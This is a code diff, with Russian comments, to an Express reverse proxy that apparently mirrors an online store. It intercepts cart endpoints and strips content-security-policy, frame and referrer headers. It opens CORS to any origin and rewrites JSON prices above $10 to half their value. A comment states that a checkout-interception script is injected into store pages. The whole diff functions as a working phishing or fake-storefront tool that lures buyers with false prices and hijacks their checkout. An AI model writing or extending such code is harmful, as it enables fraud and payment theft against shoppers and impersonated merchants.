@@ -79,6 +79,43 @@ app.get('*checkout*', (req, res) => {
       next();
     });
 
+    // Проксируем все AJAX запросы для корзины и цен
+    app.get('/cart.js', (req, res, next) => {
+      console.log('🛒 Cart.js intercepted:', req.url);
+      next();
+    });
+
+    app.get('/recommendations/*', (req, res, next) => {
+      console.log('🛒 Recommendations intercepted:', req.url);
+      next();
+    });
+
+    app.get('/cdn/*', (req, res, next) => {
+      console.log('📦 CDN request intercepted:', req.url);
+      next();
+    });
+
+    // Проксируем все AJAX запросы к корзине
+    app.post('/cart/add.js', (req, res, next) => {
+      console.log('🛒 Cart add.js intercepted:', req.url);
+      next();
+    });
+
+    app.post('/cart/update.js', (req, res, next) => {
+      console.log('🛒 Cart update.js intercepted:', req.url);
+      next();
+    });
+
+    app.post('/cart/change.js', (req, res, next) => {
+      console.log('🛒 Cart change.js intercepted:', req.url);
+      next();
+    });
+
+    app.post('/cart/clear.js', (req, res, next) => {
+      console.log('🛒 Cart clear.js intercepted:', req.url);
+      next();
+    });
+
 // Обработка POST запросов (возвращаем 200 для избежания ошибок)
 app.post('/api/*', (req, res) => {
   res.status(200).json({ success: true });
@@ -153,24 +190,100 @@ const proxyOptions = {
     proxyReq.setHeader('Connection', 'keep-alive');
     proxyReq.setHeader('Cache-Control', 'no-cache');
   },
-  onProxyRes: (proxyRes, req, res) => {
-    // Удаляем проблемные заголовки
-    delete proxyRes.headers['x-frame-options'];
-    delete proxyRes.headers['content-security-policy'];
-    delete proxyRes.headers['x-content-type-options'];
-    delete proxyRes.headers['referrer-policy'];
-    
-    // Добавляем кэширование
-    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
-      proxyRes.headers['Cache-Control'] = 'public, max-age=300'; // 5 минут кэш
-    }
-    
-    // Добавляем CORS
-    proxyRes.headers['Access-Control-Allow-Origin'] = '*';
-    proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
-    proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With';
-    
-    // Инжектируем скрипт перехвата checkout
+      onProxyRes: (proxyRes, req, res) => {
+        // Удаляем проблемные заголовки
+        delete proxyRes.headers['x-frame-options'];
+        delete proxyRes.headers['content-security-policy'];
+        delete proxyRes.headers['x-content-type-options'];
+        delete proxyRes.headers['referrer-policy'];
+        
+        // Добавляем кэширование
+        if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
+          proxyRes.headers['Cache-Control'] = 'public, max-age=300'; // 5 минут кэш
+        }
+        
+        // Добавляем CORS
+        proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+        proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+        proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With';
+        
+        // Перехватываем JSON ответы для изменения цен
+        if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('application/json')) {
+          let body = '';
+          proxyRes.on('data', (chunk) => {
+            body += chunk;
+          });
+          
+          proxyRes.on('end', () => {
+            try {
+              const jsonData = JSON.parse(body);
+              
+              // Изменяем цены в JSON
+              function modifyPricesInObject(obj) {
+                if (typeof obj === 'object' && obj !== null) {
+                  for (const key in obj) {
+                    if (typeof obj[key] === 'string') {
+                      // Ищем цены в строках
+                      obj[key] = obj[key].replace(/From\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
+                        const cleanPrice = price.replace(/,/g, '');
+                        const originalPrice = parseFloat(cleanPrice);
+                        
+                        if (!isNaN(originalPrice) && originalPrice > 10) {
+                          const newPrice = Math.round(originalPrice / 2 * 100) / 100;
+                          const formattedPrice = newPrice.toLocaleString('en-US', {
+                            minimumFractionDigits: 2,
+                            maximumFractionDigits: 2
+                          });
+                          
+                          console.log(`💰 JSON price changed: From $${price} USD -> From $${formattedPrice} USD`);
+                          return `From $${formattedPrice} USD`;
+                        }
+                        return match;
+                      });
+                      
+                      obj[key] = obj[key].replace(/\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
+                        const cleanPrice = price.replace(/,/g, '');
+                        const originalPrice = parseFloat(cleanPrice);
+                        
+                        if (!isNaN(originalPrice) && originalPrice > 10) {
+                          const newPrice = Math.round(originalPrice / 2 * 100) / 100;
+                          const formattedPrice = newPrice.toLocaleString('en-US', {
+                            minimumFractionDigits: 2,
+                            maximumFractionDigits: 2
+                          });
+                          
+                          console.log(`💰 JSON price changed: $${price} USD -> $${formattedPrice} USD`);
+                          return `$${formattedPrice} USD`;
+                        }
+                        return match;
+                      });
+                    } else if (typeof obj[key] === 'object') {
+                      modifyPricesInObject(obj[key]);
+                    }
+                  }
+                }
+              }
+              
+              modifyPricesInObject(jsonData);
+              
+              if (!res.headersSent) {
+                res.setHeader('Content-Type', 'application/json');
+                res.setHeader('Content-Length', Buffer.byteLength(JSON.stringify(jsonData)));
+                res.end(JSON.stringify(jsonData));
+              }
+            } catch (e) {
+              console.error('JSON parsing error:', e);
+              if (!res.headersSent) {
+                res.setHeader('Content-Length', Buffer.byteLength(body));
+                res.end(body);
+              }
+            }
+          });
+          
+          return;
+        }
+        
+        // Инжектируем скрипт перехвата checkout
     if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
       let body = '';
       proxyRes.on('data', (chunk) => {
